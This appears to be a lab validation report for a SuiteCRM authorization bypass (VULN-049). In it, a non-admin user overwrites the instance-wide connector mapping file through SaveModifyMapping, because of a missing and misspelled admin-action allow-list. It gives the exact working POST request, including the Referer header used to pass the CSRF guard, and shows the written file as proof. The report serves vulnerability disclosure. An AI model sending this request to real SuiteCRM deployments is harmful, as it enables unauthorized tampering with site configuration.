# VULN-049 — Connectors module admin-gate bypass: non-admin writes global connector config

**Software**: SuiteCRM
**Repository**: https://github.com/SuiteCRM/SuiteCRM
**Affected version**: 7.15.2 (suitecrm_version.php) — commit-pinned forkedSuite snapshot
**Status**: CONFIRMED
**Severity (static)**: Medium
**Target commit**: 62effd0ceb767ed3b634ade585b19a6633eb4fcb
**Validated at**: 2026-09-28T20:46Z

## Preconditions
- `automation.py` creates one fresh low-priv (non-admin) user **U** via admin (`create_user`).
- Targets the default-shipped `ext_rest_insideview` connector source (present out of the box; `ConnectorUtils::getConnectors()` auto-discovers it from `modules/Connectors/connectors/sources/ext/rest/insideview/config.php` since no `custom/modules/Connectors/metadata/connectors.php` cache exists in this lab — verified via `docker compose exec app ls`).
- **Gotcha hit and fixed while building this exploit**: the first attempt omitted a `Referer` header and was rejected with SuiteCRM's own XSRF page (`"Possible Cross Site Request Forgery (XSRF) Attack Detected"`) — confirming [the vuln doc's own note](VULN-049.md) that `SaveModifyMapping`/`SaveModifyDisplay` (names starting `"Save"`) are covered by the *separate* Referer-based CSRF guard (`isModifyAction()`, `include/MVC/SugarApplication.php:505`). Adding a same-host `Referer` header (as directed by `TARGET_FACTS.md` for all modify actions) resolved this — consistent with the doc's claim that CSRF protection is intact here and the **admin-gate** is the defect being demonstrated, not CSRF.

## Request
See `request.http`. As **U** (non-admin), with a valid same-host Referer:
```
POST /index.php?module=Connectors&action=SaveModifyMapping
Cookie: PHPSESSID=<U session>
Referer: http://localhost:33116/index.php?module=Connectors&action=ModifyMapping
Content-Type: application/x-www-form-urlencoded

mapping_sources=ext_rest_insideview&mapping_values=ext_rest_insideview:Accounts:name=vuln049marker_70d1c808&from_unit_test=1
```

## Response
See `response.txt` (HTTP 200, full re-rendered Connectors page — `action_SaveModifyMapping` sets no `$this->view`, so the default view renders after the write completes; no denial page).

## Observation
Matches the static finding exactly:
1. **Control** (`evidence/00_control_ConnectorSettings_response.txt`) — the same U, same session, POSTs `action=ConnectorSettings` (correctly spelled in `$admin_actions`) and is denied with `<p class="error">Warning: You do not have permission to access this module.</p>`.
2. **Attack** — `action=SaveModifyMapping` is **absent entirely** from `$admin_actions` (`modules/Connectors/controller.php:52-54`), so `hasAccess` is never cleared for U; `action_SaveModifyMapping()` (`:613-680`) runs to completion, reaching `write_array_to_file('mapping', $mapping, "{$dir}/mapping.php")` at `:664`.
3. **Real effect, verified on disk** — `docker compose exec app cat custom/modules/Connectors/connectors/sources/ext/rest/insideview/mapping.php` (`evidence/mapping_php_after.txt`), which did not exist before the attack, now reads:
   ```php
   <?php
   // created: 2026-09-28 20:45:59
   $mapping = array (
     'beans' =>
     array (
       'Accounts' =>
       array (
         'name' => 'vuln049marker_70d1c808',
         'id' => 'id',
       ),
     ),
   );
   ```
   This is the instance-wide connector field-mapping file for InsideView/Accounts — written entirely by a non-admin account, and it **overwrote** the mapping structure (only the fields the attacker supplied survive; any admin-configured mapping for this source/module would have been clobbered had one existed).
4. **Bonus (`action_SaveModifyDisplay`, the OTHER gap)** — the whitelist entry `'SavedModifyDisplay'` never matches the real action name `SaveModifyDisplay`; confirmed the same non-admin U reaches this action too with no denial page (`evidence/02_bonus_SaveModifyDisplay_response.txt`).

## Side effects
One new low-priv User created (random-suffixed, harmless). One file created under `custom/modules/Connectors/connectors/sources/ext/rest/insideview/mapping.php` containing a harmless, random-suffixed marker value — scoped to a demo/inactive connector source (InsideView requires external API credentials never configured in this lab), so no live functionality was broken. No cleanup performed; left in place as evidence.

## Research & references
- CWE-285 (Improper Authorization) — incomplete/typo'd allow-list, same root cause and same `$admin_actions` array as [VULN-013](VULN-013.md).
- OWASP WSTG-ATHZ-02 (Testing for Bypassing Authorization Schema); OWASP WSTG-INPV (CSRF token vs. Referer-check distinction — used here to correctly attribute the first failed attempt to the *separate* CSRF guard, not the access-control defect under test).
